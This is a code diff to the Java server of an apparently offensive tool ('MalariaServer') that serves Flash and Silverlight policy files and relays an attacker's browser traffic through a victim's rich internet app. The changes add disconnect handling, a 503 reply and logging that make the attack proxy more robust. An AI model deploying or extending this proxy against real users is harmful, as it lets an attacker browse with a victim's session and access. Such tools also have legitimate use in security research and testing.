@@ -6,6 +6,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.PrintStream;
 import java.net.ServerSocket;
+import java.net.SocketException;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.regex.Matcher;
@@ -18,7 +19,7 @@ public class MalariaServer {
 			System.out.println(" - hostname        - hostname from which the RIA app is served");
 			System.out.println(" - port            - port number the RIA app connects back to");
 			System.out.println(" - http-proxy-port - port number attacker's browser connects back to (8080 by default)");
-			
+
 			System.exit(0);
 		}
 		int port = Integer.parseInt(args[1]);
@@ -27,7 +28,7 @@ public class MalariaServer {
 			httpProxyPort = Integer.parseInt(args[2]);
 		}
 		System.out.println("Starting listener on port " + port + " from hostname " + args[0]);
-		System.out.println("Starting http proxy on port " + httpProxyPort);		
+		System.out.println("Starting http proxy on port " + httpProxyPort);
 		new MalariaServer(args[0], port, httpProxyPort);
 	}
 
@@ -36,10 +37,11 @@ public class MalariaServer {
 		try {
 			new Thread(new SilverlightPolicyServer(hostname, port)).start();
 			new Thread(new FlexPolicyServer(hostname, port)).start();
-			
+
 			ServerSocket clientSocket = new ServerSocket(port);
 			ServerSocket proxySocket = new ServerSocket(httpProxyPort);
 			while(true) {
+				System.out.println("Waiting for client connections...");
 				serveSocket(clientSocket.accept(), proxySocket, hostname, port);
 			}
 		} catch (Exception e) {
@@ -62,9 +64,9 @@ public class MalariaServer {
 				System.out.println("Served flex policy on client socket...");
 				return;
 			}
-			
+			boolean clientAlive = true;
 			handleProxyRequests:
-			while (true) {
+			while (clientAlive) {
 				Socket proxyClient = proxySocket.accept();
 				InputStreamReader proxyIn = new InputStreamReader(proxyClient.getInputStream());
 				OutputStream proxyOut = proxyClient.getOutputStream();
@@ -82,7 +84,18 @@ public class MalariaServer {
 					ArrayList<byte[]> fullBuffer = new ArrayList<byte[]>();
 					while (!done) {
 						byte[] buffer = new byte[4096];
-						int length = clientIn.read(buffer, 0, buffer.length);
+						int length;
+						try {
+							length = clientIn.read(buffer, 0, buffer.length);
+						} catch (SocketException ex) {
+							System.out.println("Error in reading from client, client probably disconnected");
+							//System.out.println(msgb, msgb.length);
+							proxyOut.write("HTTP/1.1 503 Client disconnected, retry later\n".getBytes("UTF8"));
+							proxyOut.flush();
+							proxyClient.close();
+							clientAlive = false;
+							continue handleProxyRequests;
+						}
 						if (new String(buffer, 0, length, "UTF8").startsWith("HTTP/1.1 502 Not accessible")) {
 							proxyOut.write(buffer, 0, length);
 							proxyOut.flush();
@@ -114,9 +127,9 @@ public class MalariaServer {
 					for (int i = 0; i < fullBuffer.size(); i++) {
 						totalSize += ((byte[]) fullBuffer.get(i)).length;
 					}
-					
+
 					System.out.println("<- Sending " + totalSize + " to proxy client");
-					
+
 					String header = "HTTP/1.1 200 OK\r\n" + "Content-Length: " + totalSize + "\r\n\r\n";
 					proxyOut.write(header.getBytes("UTF8"));
 
@@ -168,8 +181,10 @@ public class MalariaServer {
 		boolean done = false;
 		while (!done) {
 			int length = clientReader.read(buffer, 0, buffer.length);
-			messageBuffer.append(buffer, 0, length);
-			System.out.println("Read " + length);
+			if (length > 0) {
+				messageBuffer.append(buffer, 0, length);
+				System.out.println("Read " + length);
+			}
 			if (length < buffer.length)
 				done = true;
 		}
